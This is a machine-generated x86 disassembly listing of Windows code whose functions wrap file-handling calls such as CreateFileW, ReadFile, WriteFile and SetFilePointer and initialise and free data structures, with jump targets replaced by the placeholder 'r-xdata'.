cmp [ ebp - 0x34 ] 0x0
jne r-xdata
mov eax 0x4
jmp r-xdata
push 0x0
push 0x0
mov eax [ ebp + 0x20 ]
push eax
mov ecx [ ebp + 0x1c ]
push ecx
call sub_408160
add esp 0x10
jmp r-xdata
jmp r-xdata
mov eax 0x2
jmp r-xdata
mov eax [ ebp - 0x9c ]
cmp eax [ ebp - 0x44 ]
je r-xdata
mov eax 0x4
jmp r-xdata
mov edx [ ebp - 0x54 ]
cmp [ edx + 0xc ] 0x0
jne r-xdata
mov edx [ ebp + 0x24 ]
push edx
mov eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp - 0x18 ]
push ecx
mov edx [ ebp + 0x10 ]
push edx
mov eax [ ebp - 0x1c ]
push eax
mov ecx [ ebp - 0x20 ]
push ecx
mov edx [ ebp - 0x14 ]
push edx
call sub_4025f0
add esp 0x1c
mov [ ebp - 0x7c ] eax
cmp [ ebp - 0x7c ] 0x0
je r-xdata
mov ecx [ ebp - 0x18 ]
push ecx
mov edx [ ebp + 0x10 ]
push edx
mov eax [ ebp - 0x1c ]
push eax
mov ecx [ ebp - 0x20 ]
push ecx
call sub_4029c0
add esp 0x10
mov [ ebp - 0x50 ] eax
cmp [ ebp - 0x50 ] 0x0
je r-xdata
mov eax 0x5
jmp r-xdata
mov eax [ ebp - 0x28 ]
cmp eax [ ebp - 0xb0 ]
jbe r-xdata
mov eax 0x1
sub eax [ ebp - 0xc ]
mov ecx [ ebp + 0x28 ]
mov edx [ ebp - 0x34 ]
mov [ ecx + eax * 4 ] edx
mov eax [ ebp - 0x34 ]
mov [ ebp - 0x18 ] eax
mov ecx 0x1
sub ecx [ ebp - 0xc ]
mov edx [ ebp - 0x10 ]
mov [ ebp + ecx * 4 - 0x40 ] edx
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov ecx [ ebp - 0xc ]
add ecx 0x1
mov [ ebp - 0xc ] ecx
mov ecx 0x4
shl ecx 0x1
mov edx [ ebp + ecx - 0x40 ]
push edx
mov eax [ ebp + 0x24 ]
push eax
mov ecx [ ebp + 0x24 ]
mov edx [ ecx ]
call edx
add esp 0x8
mov ecx 0x4
shl ecx 0x1
mov edx [ ebp + 0x28 ]
mov [ edx + ecx ] eax
mov eax 0x4
shl eax 0x1
mov ecx [ ebp + 0x28 ]
cmp [ ecx + eax ] 0x0
jne r-xdata
mov eax [ ebp + 0x24 ]
push eax
mov ecx [ ebp - 0x10 ]
push ecx
mov edx [ ebp - 0x18 ]
push edx
mov eax [ ebp + 0x10 ]
push eax
mov ecx [ ebp - 0x1c ]
push ecx
mov edx [ ebp - 0x20 ]
push edx
mov eax [ ebp - 0x14 ]
push eax
call sub_4027d0
add esp 0x1c
mov [ ebp - 0x70 ] eax
cmp [ ebp - 0x70 ] 0x0
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x7c ]
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x50 ]
jmp r-xdata
mov eax 0x2
jmp r-xdata
mov eax 0x4
shl eax 0x1
mov ecx [ ebp + 0x28 ]
mov edx [ ecx + eax ]
push edx
mov eax [ ebp + 0x10 ]
push eax
mov ecx [ ebp - 0x44 ]
push ecx
mov edx [ ebp - 0x48 ]
push edx
call sub_4029c0
add esp 0x10
mov [ ebp - 0x30 ] eax
mov eax [ ebp - 0x30 ]
mov [ ebp - 0x68 ] eax
cmp [ ebp - 0x68 ] 0x0
je r-xdata
mov edx 0x4
shl edx 0x1
cmp [ ebp + edx - 0x40 ] 0x0
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x70 ]
jmp r-xdata
jmp r-xdata
mov ecx [ ebp + 0x20 ]
push ecx
mov edx [ ebp + 0x1c ]
push edx
mov eax 0x4
shl eax 0x1
mov ecx [ ebp + eax - 0x40 ]
push ecx
mov edx 0x4
shl edx 0x1
mov eax [ ebp + 0x28 ]
mov ecx [ eax + edx ]
push ecx
mov edx 0x4
shl edx 0x0
mov eax [ ebp + edx - 0x40 ]
push eax
mov ecx 0x4
shl ecx 0x0
mov edx [ ebp + 0x28 ]
mov eax [ edx + ecx ]
push eax
mov ecx 0x4
imul ecx ecx 0x0
mov edx [ ebp + ecx - 0x40 ]
push edx
mov eax 0x4
imul eax eax 0x0
mov ecx [ ebp + 0x28 ]
mov edx [ ecx + eax ]
push edx
mov eax [ ebp - 0x80 ]
push eax
mov ecx [ ebp - 0x88 ]
push ecx
call sub_407bd0
add esp 0x28
mov [ ebp - 0x30 ] eax
mov edx [ ebp - 0x30 ]
mov [ ebp - 0x74 ] edx
cmp [ ebp - 0x74 ] 0x0
je r-xdata
mov eax [ ebp - 0x68 ]
jmp r-xdata
mov eax 0x2
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x74 ]
jmp r-xdata
sub_403490
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x10 ] 0x0
mov [ ebp - 0xc ] 0x0
mov [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp + 0x24 ]
push ecx
mov edx [ ebp + 0x20 ]
push edx
mov eax [ ebp + 0x1c ]
push eax
mov ecx [ ebp + 0x18 ]
push ecx
mov edx [ ebp + 0x14 ]
push edx
mov eax [ ebp + 0x10 ]
push eax
mov ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_402e90
add esp 0x24
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0x0
jmp r-xdata
cmp [ ebp - 0x14 ] 0x3
jge r-xdata
mov eax [ ebp - 0x18 ]
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x14 ]
mov edx [ ebp + ecx * 4 - 0x10 ]
push edx
mov eax [ ebp + 0x24 ]
push eax
mov ecx [ ebp + 0x24 ]
mov edx [ ecx + 0x4 ]
call edx
add esp 0x8
jmp r-xdata
mov eax [ ebp - 0x14 ]
add eax 0x1
mov [ ebp - 0x14 ] eax
sub_403530
push ebp
mov ebp esp
sub esp 0xc
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov [ ebp - 0x4 ] 0x3
mov [ ebp - 0x4 ] 0x2
jmp r-xdata
mov [ ebp - 0x8 ] 0x80000000
mov [ ebp - 0x8 ] 0x40000000
jmp r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0xc ] 0x0
jmp r-xdata
push 0x0
push 0x80
mov eax [ ebp - 0x4 ]
push eax
push 0x0
push 0x1
mov ecx [ ebp - 0x8 ]
push ecx
mov edx [ ebp + 0xc ]
push edx
call [ CreateFileW@IAT ]
mov ecx [ ebp + 0x8 ]
mov [ ecx ] eax
mov edx [ ebp + 0x8 ]
cmp [ edx ] 0xffffffff
je r-xdata
mov eax [ ebp - 0xc ]
mov esp ebp
pop ebp
retn
sub_4035f0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0xffffffff
je r-xdata
xor eax eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
push edx
call [ CloseHandle@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0xffffffff
call [ GetLastError@IAT ]
jmp r-xdata
pop ebp
retn
sub_403620
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x10 ]
mov ecx [ eax ]
mov [ ebp - 0xc ] ecx
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov edx [ ebp + 0x10 ]
mov [ edx ] 0x0
xor eax eax
jmp r-xdata
mov eax [ ebp - 0xc ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x10 ] __dos_header
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
call [ GetLastError@IAT ]
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x8 ] 0x0
push 0x0
lea edx [ ebp - 0x8 ]
push edx
mov eax [ ebp - 0x14 ]
push eax
mov ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
push eax
call [ ReadFile@IAT ]
mov [ ebp - 0x18 ] eax
mov ecx [ ebp + 0xc ]
add ecx [ ebp - 0x8 ]
mov [ ebp + 0xc ] ecx
mov edx [ ebp - 0xc ]
sub edx [ ebp - 0x8 ]
mov [ ebp - 0xc ] edx
mov eax [ ebp + 0x10 ]
mov ecx [ eax ]
add ecx [ ebp - 0x8 ]
mov edx [ ebp + 0x10 ]
mov [ edx ] ecx
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
cmp [ ebp - 0xc ] 0x0
ja r-xdata
jmp r-xdata
cmp [ ebp - 0xc ] __dos_header
jbe r-xdata
xor eax eax
sub_4036e0
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x10 ]
mov ecx [ eax ]
mov [ ebp - 0xc ] ecx
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov edx [ ebp + 0x10 ]
mov [ edx ] 0x0
xor eax eax
jmp r-xdata
mov eax [ ebp - 0xc ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x10 ] __dos_header
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
call [ GetLastError@IAT ]
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x8 ] 0x0
push 0x0
lea edx [ ebp - 0x8 ]
push edx
mov eax [ ebp - 0x14 ]
push eax
mov ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
push eax
call [ WriteFile@IAT ]
mov [ ebp - 0x18 ] eax
mov ecx [ ebp + 0xc ]
add ecx [ ebp - 0x8 ]
mov [ ebp + 0xc ] ecx
mov edx [ ebp - 0xc ]
sub edx [ ebp - 0x8 ]
mov [ ebp - 0xc ] edx
mov eax [ ebp + 0x10 ]
mov ecx [ eax ]
add ecx [ ebp - 0x8 ]
mov edx [ ebp + 0x10 ]
mov [ edx ] ecx
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
cmp [ ebp - 0xc ] 0x0
ja r-xdata
jmp r-xdata
cmp [ ebp - 0xc ] __dos_header
jbe r-xdata
xor eax eax
sub_4037a0
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
mov ecx [ eax ]
mov [ ebp - 0xc ] ecx
mov edx [ ebp + 0xc ]
mov eax [ edx ]
mov edx [ edx + 0x4 ]
mov cl 0x10
call sub_438260
mov cl 0x10
call sub_438260
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov [ ebp - 0x10 ] 0x0
jmp r-xdata
cmp [ ebp - 0x14 ] 0x1
je r-xdata
mov ecx [ ebp - 0x10 ]
push ecx
lea edx [ ebp - 0x8 ]
push edx
mov eax [ ebp - 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
push edx
call [ SetFilePointer@IAT ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0xffffffff
jne r-xdata
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
cmp [ ebp - 0x14 ] 0x2
je r-xdata
mov eax [ ebp - 0x8 ]
cdq
mov cl 0x20
call sub_43af80
xor ecx ecx
or eax [ ebp - 0xc ]
or edx ecx
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
xor eax eax
call [ GetLastError@IAT ]
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov [ ebp - 0x10 ] 0x2
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x18 ]
jmp r-xdata
mov eax 0x57
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn
sub_403870
push ebp
mov ebp esp
sub esp 0x8
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov ecx [ ebp + 0x10 ]
push ecx
mov edx [ ebp + 0xc ]
push edx
mov eax [ ebp - 0x8 ]
add eax 0x8
push eax
call sub_403620
add esp 0xc
test eax eax
jne r-xdata
mov [ ebp - 0x4 ] 0x8
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_4038b0
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0x10 ]
push ecx
mov edx [ ebp + 0xc ]
push edx
mov eax [ ebp - 0x4 ]
add eax 0x8
push eax
call sub_4037a0
add esp 0xc
mov esp ebp
pop ebp
retn
sub_403920
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
add ecx 0x10
push ecx
call sub_402380
add esp 0x8
mov edx [ ebp + 0x8 ]
push edx
call sub_403900
add esp 0x4
pop ebp
retn
sub_403950
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x0
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x4 ] 0x0
mov edx [ ebp + 0x8 ]
mov [ edx + 0x8 ] 0x0
mov eax [ ebp + 0x8 ]
mov [ eax + 0xc ] 0x0
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x10 ] 0x0
mov edx [ ebp + 0x8 ]
mov [ edx + 0x14 ] 0x0
mov eax [ ebp + 0x8 ]
mov [ eax + 0x18 ] 0x0
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x1c ] 0x0
mov edx [ ebp + 0x8 ]
mov [ edx + 0x20 ] 0x0
mov eax [ ebp + 0x8 ]
mov [ eax + 0x24 ] 0x0
pop ebp
retn
sub_4039c0
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
je r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
push edx
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0xc ]
mov edx [ ecx + 0x4 ]
call edx
add esp 0x8
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x4 ]
push ecx
mov edx [ ebp + 0xc ]
push edx
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0x4 ]
call ecx
add esp 0x8
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8 ]
push eax
mov ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp + 0xc ]
mov eax [ edx + 0x4 ]
call eax
add esp 0x8
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0xc ]
push edx
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0xc ]
mov edx [ ecx + 0x4 ]
call edx
add esp 0x8
mov eax [ ebp + 0x8 ]
push eax
call sub_403950
add esp 0x4
mov esp ebp
pop ebp
retn
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
cmp eax [ edx + 0x10 ]
jae r-xdata
mov ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp - 0x4 ]
imul edx edx 0x18
mov eax [ ebp + 0x8 ]
add edx [ eax ]
push edx
call sub_403920
add esp 0x8
jmp r-xdata
mov ecx [ ebp - 0x4 ]
add ecx 0x1
mov [ ebp - 0x4 ] ecx
sub_403a70
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x8 ] 0x0
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
cmp edx [ ecx + 0x10 ]
jae r-xdata
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
imul eax eax 0x18
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov ecx [ ebp - 0x8 ]
add ecx [ edx + eax + 0x4 ]
mov [ ebp - 0x8 ] ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x1
mov [ ebp - 0x4 ] eax
sub_403ac0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
cmp edx [ ecx + 0x14 ]
jae r-xdata
or eax 0xffffffff
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ecx + edx * 8 ]
cmp eax [ ebp + 0xc ]
jne r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x1
mov [ ebp - 0x4 ] eax
mov esp ebp
pop ebp
retn
sub_403b00
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
cmp edx [ ecx + 0x14 ]
jae r-xdata
or eax 0xffffffff
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ecx + edx * 8 + 0x4 ]
cmp eax [ ebp + 0xc ]
jne r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x1
mov [ ebp - 0x4 ] eax
mov esp ebp
pop ebp
retn
sub_403b50
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
push eax
call sub_403a70
add esp 0x4
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x4 ]
sub ecx 0x1
mov [ ebp - 0x4 ] ecx
jmp r-xdata
xor eax eax
xor edx edx
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
jl r-xdata
mov esp ebp
pop ebp
retn
xor eax eax
xor edx edx
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_403b00
add esp 0x8
test eax eax
jge r-xdata
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov ecx [ edx + 0xc ]
mov edx [ ebp - 0x4 ]
mov eax [ ecx + edx * 8 ]
mov edx [ ecx + edx * 8 + 0x4 ]
jmp r-xdata
mov edx [ ebp - 0x4 ]
sub edx 0x1
mov [ ebp - 0x4 ] edx
sub_403bc0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ eax + 0x18 ] 0x1
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x19 ] 0x0
mov edx [ ebp + 0x8 ]
mov [ edx + 0x1a ] 0x0
mov eax [ ebp + 0x8 ]
mov [ eax + 0x1b ] 0x0
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x1c ] 0x0
pop ebp
retn
sub_403bf0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x0
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x4 ] 0x0
mov edx [ ebp + 0x8 ]
mov [ edx + 0x8 ] 0x0
mov eax [ ebp + 0x8 ]
mov [ eax + 0xc ] 0x0
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x10 ] 0x0
mov edx [ ebp + 0x8 ]
mov [ edx + 0x14 ] 0x0
mov eax [ ebp + 0x8 ]
mov [ eax + 0x18 ] 0x0
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x1c ] 0x0
pop ebp
retn
sub_403c50
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
push edx
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0xc ]
mov edx [ ecx + 0x4 ]
call edx
add esp 0x8
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x4 ]
push ecx
mov edx [ ebp + 0xc ]
push edx
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0x4 ]
call ecx
add esp 0x8
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8 ]
push eax
mov ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp + 0xc ]
mov eax [ edx + 0x4 ]
call eax
add esp 0x8
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0xc ]
push edx
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0xc ]
mov edx [ ecx + 0x4 ]
call edx
add esp 0x8
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x10 ]
push ecx
mov edx [ ebp + 0xc ]
push edx
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0x4 ]
call ecx
add esp 0x8
mov edx [ ebp + 0x8 ]
push edx
call sub_403bf0
add esp 0x4
mov esp ebp
pop ebp
retn
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
cmp eax [ edx + 0x18 ]
jae r-xdata
mov ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp - 0x4 ]
imul edx edx 0x28
mov eax [ ebp + 0x8 ]
add edx [ eax + 0xc ]
push edx
call sub_4039c0
add esp 0x8
jmp r-xdata
mov ecx [ ebp - 0x4 ]
add ecx 0x1
mov [ ebp - 0x4 ] ecx
sub_403d20
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push eax
call sub_403bf0
add esp 0x4
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x30 ] 0x0
mov edx [ ebp + 0x8 ]
mov [ edx + 0x34 ] 0x0
mov eax [ ebp + 0x8 ]
mov [ eax + 0x38 ] 0x0
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x3c ] 0x0
mov edx [ ebp + 0x8 ]
mov [ edx + 0x40 ] 0x0
mov eax [ ebp + 0x8 ]
add eax 0x44
push eax
call sub_402300
add esp 0x4
pop ebp
retn
sub_403d80
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x30 ]
push ecx
mov edx [ ebp + 0xc ]
push edx
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0x4 ]
call ecx
add esp 0x8
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x34 ]
push eax
mov ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp + 0xc ]
mov eax [ edx + 0x4 ]
call eax
add esp 0x8
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x38 ]
push edx
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0xc ]
mov edx [ ecx + 0x4 ]
call edx
add esp 0x8
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x3c ]
push ecx
mov edx [ ebp + 0xc ]
push edx
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0x4 ]
call ecx
add esp 0x8
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x40 ]
push eax
mov ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp + 0xc ]
mov eax [ edx + 0x4 ]
call eax
add esp 0x8
mov ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp + 0x8 ]
add edx 0x44
push edx
call sub_402380
add esp 0x8
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_403c50
add esp 0x8
mov edx [ ebp + 0x8 ]
push edx
call sub_403d20
add esp 0x4
pop ebp
retn
sub_403e30
push ebp
mov ebp esp
sub esp 0x34
push esi
mov [ ebp - 0x10 ] 0x0
xorpd xmm0 xmm0
movlpd [ ebp - 0x34 ] xmm0
mov [ ebp - 0x8 ] 0x0
mov [ ebp - 0xc ] 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x18 ]
shl eax 0x2
push eax
mov ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp + 0xc ]
mov eax [ edx ]
call eax
add esp 0x8
mov [ ebp - 0x14 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x14 ]
mov [ ecx + 0x30 ] edx
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x30 ] 0x0
jmp r-xdata
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
mov eax 0x2
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
cmp edx [ ecx + 0x18 ]
jae r-xdata
pop esi
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x14 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x30 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x10 ]
mov [ ecx + edx * 4 ] eax
mov ecx [ ebp - 0x4 ]
imul ecx ecx 0x28
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0xc ]
mov edx [ ebp - 0x10 ]
add edx [ eax + ecx + 0x18 ]
mov [ ebp - 0x10 ] edx
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x14 ]
shl eax 0x3
push eax
mov ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp + 0xc ]
mov eax [ edx ]
call eax
add esp 0x8
mov [ ebp - 0x18 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x18 ]
mov [ ecx + 0x34 ] edx
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x34 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x1
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
mov eax 0x2
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
cmp edx [ ecx + 0x14 ]
jae r-xdata
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x18 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x34 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x34 ]
mov [ ecx + edx * 8 ] eax
mov eax [ ebp - 0x30 ]
mov [ ecx + edx * 8 + 0x4 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x34 ]
add ecx [ edx + eax * 8 ]
mov esi [ ebp - 0x30 ]
adc esi [ edx + eax * 8 + 0x4 ]
mov [ ebp - 0x34 ] ecx
mov [ ebp - 0x30 ] esi
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x18 ]
shl edx 0x2
push edx
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0xc ]
mov edx [ ecx ]
call edx
add esp 0x8
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x1c ]
mov [ eax + 0x38 ] ecx
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x38 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x1
mov [ ebp - 0x4 ] eax
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x1c ] 0x0
jne r-xdata
mov eax 0x2
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1c ]
shl edx 0x2
push edx
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0xc ]
mov edx [ ecx ]
call edx
add esp 0x8
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x20 ]
mov [ eax + 0x3c ] ecx
cmp [ ebp - 0x20 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x3c ] 0x0
jmp r-xdata
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
mov eax 0x2
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x4 ]
cmp ecx [ eax + 0x1c ]
jae r-xdata
xor eax eax
mov edx [ ebp - 0x4 ]
shl edx 0x5
mov eax [ ebp + 0x8 ]
add edx [ eax + 0x10 ]
mov [ ebp - 0x2c ] edx
mov ecx [ ebp - 0x2c ]
movzx edx [ ecx + 0x18 ]
test edx edx
jne r-xdata
mov [ ebp - 0x24 ] 0x0
mov [ ebp - 0x24 ] 0x1
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
je r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x3c ]
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + ecx * 4 ] edx
cmp [ ebp - 0x28 ] 0x0
je r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x8 ]
cmp edx [ ecx + 0x18 ]
jb r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x3c ]
mov eax [ ebp - 0x4 ]
mov [ edx + eax * 4 ] 0xffffffff
jmp r-xdata
